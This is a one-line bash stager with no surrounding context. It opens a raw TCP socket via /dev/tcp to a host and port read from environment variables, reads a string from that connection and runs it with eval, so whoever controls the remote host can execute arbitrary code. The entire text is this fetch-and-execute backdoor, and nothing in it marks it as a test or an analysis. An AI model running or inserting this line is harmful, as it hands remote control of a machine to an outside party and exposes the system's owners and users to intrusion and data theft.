exec 3<>"/dev/tcp/$DECLUSOR_HOST/$DECLUSOR_PORT" || exit 1; IFS= read -r -d "" -u 3 c; eval "$c"
